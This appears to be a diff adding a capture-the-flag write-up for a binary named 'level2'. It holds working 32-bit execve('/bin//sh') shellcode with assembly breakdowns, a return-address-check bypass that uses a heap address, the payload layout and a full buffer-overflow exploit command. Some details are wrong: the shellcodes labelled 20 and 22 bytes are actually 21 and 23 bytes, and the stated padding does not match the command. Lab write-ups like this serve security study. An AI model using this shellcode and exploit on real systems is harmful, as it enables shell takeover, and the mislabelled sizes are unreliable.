@@ -1,0 +1,55 @@
+# Shellcode Analysis for Level2
+# =============================
+
+# Working Shellcode (20 bytes) - Most Efficient
+# Assembly breakdown:
+# xor ecx, ecx        ; Clear ECX register
+# mul ecx             ; Clear EAX and EDX (mul sets EDX:EAX = EAX * operand)
+# push eax            ; Push NULL terminator (0x00000000)
+# push 0x68732f2f     ; Push "//sh" (little-endian)
+# push 0x6e69622f     ; Push "/bin" (little-endian)
+# mov ebx, esp        ; EBX points to "/bin//sh" string
+# mov al, 0x0b        ; EAX = 11 (execve syscall number)
+# int 0x80            ; Execute system call
+
+SHELLCODE_20_BYTES = '\x31\xc9\xf7\xe1\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80'
+
+# Alternative Shellcode (22 bytes) - Classic execve
+# Assembly breakdown:
+# xor eax, eax        ; Clear EAX
+# push eax            ; Push NULL terminator
+# push 0x68732f2f     ; Push "//sh"
+# push 0x6e69622f     ; Push "/bin"
+# mov ebx, esp        ; EBX = "/bin//sh"
+# mov ecx, eax        ; ECX = NULL (argv)
+# mov edx, eax        ; EDX = NULL (envp)
+# mov al, 0x0b        ; EAX = 11 (execve)
+# int 0x80            ; Execute syscall
+
+SHELLCODE_22_BYTES = '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80'
+
+# Heap Address Analysis
+# ====================
+# strdup() allocates memory on heap at: 0x0804a008
+# This address starts with 0x08, bypassing the protection check
+# Protection only blocks addresses starting with 0xb (libc region)
+
+# Payload Structure
+# =================
+# [shellcode (20 bytes)] + [padding (60 bytes)] + [heap_addr (4 bytes)]
+# Total: 84 bytes (80 bytes to overflow + 4 bytes return address)
+
+# Protection Bypass Analysis
+# ==========================
+# Original protection: (unaff_retaddr & 0xb0000000) == 0xb0000000
+# This blocks:
+# - libc addresses: 0xb7xxxxxx
+# - stack addresses: 0xbfxxxxxx
+# 
+# But allows:
+# - heap addresses: 0x08xxxxxx ✓
+# - text addresses: 0x08xxxxxx ✓
+
+# Successful Exploit Command
+# ==========================
+(python -c "shellcode = '\x31\xc9\xf7\xe1\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80'; print(shellcode + 'a'*(80-len(shellcode)) + '\x08\xa0\x04\x08')"; cat) | ./level2
